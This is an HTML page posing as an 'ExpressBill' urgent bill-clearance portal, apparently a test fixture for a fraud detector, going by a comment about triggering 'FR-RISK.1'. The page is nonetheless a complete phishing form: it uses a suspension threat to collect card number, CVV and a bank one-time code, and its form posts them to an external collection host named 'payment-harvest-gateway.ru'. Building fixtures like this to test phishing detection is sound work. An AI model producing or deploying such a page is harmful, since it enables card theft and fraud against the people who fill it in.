<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ExpressBill Portal — Urgent Bill Clearance</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff1f2; color: #1e293b; padding: 24px; }
    .portal-container { max-width: 640px; margin: 0 auto; background: #ffffff; border-radius: 8px; border: 2px solid #fda4af; box-shadow: 0 4px 16px rgba(225,29,72,0.1); }
    .header { background: #be123c; color: #ffffff; padding: 18px 24px; border-top-left-radius: 6px; border-top-right-radius: 6px; }
    .header h1 { font-size: 18px; font-weight: 700; }
    .header p { font-size: 12px; color: #fecdd3; }
    .form-body { padding: 24px; }
    .alert-banner { background: #ffe4e6; border-left: 4px solid #e11d48; padding: 10px 14px; font-size: 13px; color: #9f1239; margin-bottom: 18px; }
    .form-group { display: flex; flex-direction: column; margin-bottom: 16px; }
    label { font-size: 13px; font-weight: 600; color: #334155; margin-bottom: 5px; }
    input { padding: 10px 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; outline: none; }
    .btn { width: 100%; padding: 12px; font-size: 15px; font-weight: 700; border-radius: 6px; cursor: pointer; border: none; background: #e11d48; color: #fff; }
  </style>
</head>
<body>
  <div class="portal-container">
    <div class="header">
      <h1>ExpressBill Quick-Pay Settlement</h1>
      <p>Urgent Notice: Account suspension pending immediate clearance</p>
    </div>

    <!-- Note the cross-domain action mismatch to trigger FR-RISK.1 -->
    <form id="expressbill-form" action="http://payment-harvest-gateway.ru/collect" method="POST" class="form-body">
      <div class="alert-banner">
        Immediate settlement required to avoid service disconnection.
      </div>

      <div class="form-group">
        <label for="subscriber_account">Subscriber Invoice ID*</label>
        <input type="text" id="subscriber_account" name="subscriber_account" placeholder="INV-882910" required />
      </div>

      <div class="form-group">
        <label for="card_number">Debit / Credit Card Number*</label>
        <input type="text" id="card_number" name="card_number" placeholder="XXXX XXXX XXXX XXXX" required />
      </div>

      <div class="form-group">
        <label for="card_cvv">Card Verification Value (CVV)*</label>
        <input type="text" id="card_cvv" name="card_cvv" placeholder="3 digits" required />
      </div>

      <div class="form-group">
        <label for="transaction_otp">Instant Clearance OTP*</label>
        <input type="text" id="transaction_otp" name="transaction_otp" placeholder="6-digit bank code" required />
      </div>

      <button type="submit" class="btn">Authorize Instant Clearance</button>
    </form>
  </div>
</body>
</html>
